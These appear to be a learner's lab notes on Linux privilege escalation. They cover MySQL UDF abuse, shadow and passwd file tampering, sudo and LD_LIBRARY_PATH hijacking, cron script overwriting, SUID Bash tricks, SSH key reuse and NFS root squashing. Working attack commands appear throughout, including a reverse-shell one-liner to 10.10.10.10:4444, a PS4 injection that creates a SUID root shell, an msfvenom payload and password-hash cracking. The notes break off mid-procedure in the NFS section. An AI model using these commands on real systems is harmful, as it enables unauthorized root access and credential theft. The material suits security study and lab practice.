### Service Exploitation

>[!Scenario]
>We have a service running as a root and the root user for the service has no password assigned.  The service has a _User Defined function_ feature.  The service is _MySQL_


_approach..._
1. find for available exploit. [here](https://www.exploit-db.com/exploits/1518)
2. follow the procedure described on the exploit 
3. gain the root shell. 

>[! Takeaway]
> `UDFs` --) is essentially a set of instructions you create to perform a specific task within a program. Think of it as a mini-program you can write to avoid repeating the same code over and over.
> If we are allowed to log in as a `root` and create a service, let that service be moving the `/bin/bash` file with `SUID` permission to our accessible environment. Wollaa

_What is it about `/bin/bash` , tho?_

 - it is a symbolic link that points to the actual Bash executable on your system.


### Weak File Permission
#### Readable /etc/shadow

>[! Scenario]
> found a readable /etc/shadow file, where the password of users is stored, including of root. 

_What can we do to exploit this?_

- well, use copy the file to somewhere else and use `john` to crack it.


### Weak File Permissions - Writable /etc/shadow

>[! scenario] 
>The `/etc/shadow` file is not readable, but it's `world-writable` - anybody could write on it.

_Exploitation,..._
- well write on it
- replace the hashed pass of the root user with the new password hashed.  
- or create a new user with root privilege and sing in with it

### Writable /etc/passwd
_Exploitation_
- replace the `X` of password field of root user and save the system from checking from `/etc/shadow` 

### `Sudo` - Shell Escape Sequence 

To list list of programs that the `sudo` allows their user to run with elevated privilege  

```zsh
sudo -l
```

_Why do we care about these programs?_
There's something for us [here]([https://gtfobins.github.io](https://gtfobins.github.io/))

### `sudo` - Environment variables

the output of `sudo -l` also contains inherited environment variables,  

These variables might contain list of directories where shared libraries are searched for first

> while opening the `sudo` allowed programs set the environment variable to the directory where the malicious program is in. Remember to name the mal program with the name the program searches it to be.

_Example_
use..
```zsh
ldd /usr/sbin/apache2
```

to see shared libraries used by `apache2`

say you have `libcrypt.so.1`

now put the malicious file to `/tmp` folder with the name  `libcrypt.so.1` 

now open the apache2 program as follows 
```zsh
sudo LD_LIBRARY_PATH=/tmp apache2
```

### Cron Jobs

- Cron table files (crontabs) store the configuration for cron jobs.
- The system-wide crontab is located at `/etc/crontab`.

>[! Scenario]
> while exploring `/etc/crontab` file you saw a script `overwrite.sh` that runs every 5 minutes. Further investigation of this file revealed that this file is world-writable 

_how to exploit this?_

- well it could be overwritten, therefore... find a good script that grants us a root shell
- how about this, 
```zsh
#!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```
#### code breakdown
- `#!/bin/bash  ` shebang, specifies that the script should be interpreted by Bash shell `/bin/bash`
- `bash -i` starts new Bash shell session
- `>&` double greater than, for both standard output and standard error redirection
- `dev/tcp/10.10.10.10/4444 ` specifies target for redirection
- `0>&1` redirects file descriptor '0', which is input, is redirected to where previous stdout and stderr is redirected.  

the attacker shall listen to the upcoming connection by opening a port on his machine 
```zsh
nc -nvlp 4444
```

### SUID/ DGID Executable

to find SUID/SGID executable on Debian 
```zsh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

then try to find exploitable file from those files
`or`
try to exploit though the shared object. The drill is to inject the malicious file for the shared object.

To see shared objects one can use `strace`

### SUID / SGID Executables - Abusing Shell Feature

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
```zsh
function /usr/sbin/service { /bin/bash -p; }  
export -f /usr/sbin/service
```

therefore now when we run a SUID program that uses `/usr/sbin/service` path, what actually executed is the function we defined. therefore, wuollaaa

Again in Bash versions <4.4, when in debugging mode Bash uses the environment variable `PS4` to display an extra prompt for debugging statements.
What if we try to insert a command when prompted, 
```zsh
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

have a closer look on `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'` part. 

now we can do `/tmp/rootbash -p` to get to `root`

### History file
the user(root) might have stroke the pass keys mistakenly, so taking a look doesn't hurt
```zsh
cat ~/.history | less
```

### Config file
another place to look for a password is `config files`

### SSH Keys
try to look at `ls -l /.ssh`, you might get unprotected key
for ssh to use it, do ``chmod 600 root_key``
then try to log in using this key 

```zsh
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP
```

### NFS

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

take a look at `cat /etc/exports` for a mount point where `root-squashing` is disabled.

1. on attacker's machine `mkdir /tmp/nfs`
2. `mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs` -- assume `/tmp` is the no-root-squashing file
3. generate payload 
	``msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf``

	